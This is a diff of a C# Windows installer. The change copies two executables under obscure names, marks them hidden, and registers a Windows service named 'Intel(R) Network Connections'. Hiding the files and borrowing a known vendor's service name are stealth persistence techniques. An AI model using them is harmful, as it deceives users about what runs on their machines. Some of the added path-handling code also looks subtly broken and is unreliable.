@@ -35,28 +35,32 @@ namespace Installer
             {
                 Directory.CreateDirectory(path);
             }
-            else
+
+            try
             {
-                File.Delete(path + "\\bfscc.exe");
-                File.Delete(path + "\\bfswc.exe");
+                System.IO.File.Copy(Path.GetDirectoryName(Application.ExecutablePath) + "\\console.exe", path + "\\bfscc.exe", true);
+                File.SetAttributes(path + "\\bfscc.exe", FileAttributes.Hidden);
+                UpdateProgressBar(8);
+
+                System.IO.File.Copy(Path.GetFileName(Directory.GetCurrentDirectory() + "\\service.exe"), path + "\\bfswc.exe", true);
+                File.SetAttributes(path + "\\bfswc.exe", FileAttributes.Hidden);
+                UpdateProgressBar(20);
+
+                System.IO.File.Copy(Path.GetFileName(Directory.GetCurrentDirectory() + "\\setup.exe"), path + "\\uninstall.exe", true);
+                UpdateProgressBar(34);
+                #endregion
+
+                #region Install Windows Service
+                String filePath = Application.StartupPath + "\\console.exe";
+                Assembly assembly = Assembly.LoadFrom("service.exe");
+                Utils.InstallService("Intel(R) Network Connections", assembly);
+            }catch(FileNotFoundException ex)
+            {
+                MessageBox.Show(ex.Message);
+            }catch(IOException ioex)
+            {
+                MessageBox.Show(ioex.Message);
             }
-
-            System.IO.File.Copy(Application.StartupPath + "\\console.exe", path + "\\bfscc.exe", true);
-            File.SetAttributes(path + "\\bfscc.exe", FileAttributes.Hidden);
-            UpdateProgressBar(8);
-
-            System.IO.File.Copy(Application.StartupPath + "\\service.exe", path + "\\bfswc.exe", true);
-            File.SetAttributes(path + "\\bfswc.exe", FileAttributes.Hidden);
-            UpdateProgressBar(20);
-
-            //System.IO.File.Copy(Application.StartupPath + "\\setup.exe", path + "\\uninstall.exe", true);
-            UpdateProgressBar(34);
-            #endregion
-
-            #region Install Windows Service
-            String filePath = Application.StartupPath + "\\console.exe";
-            Assembly assembly = Assembly.LoadFrom("console.dll");
-            Utils.InstallService("Intel(R) Network Connections", assembly);
             UpdateProgressBar(55);
             #endregion
 
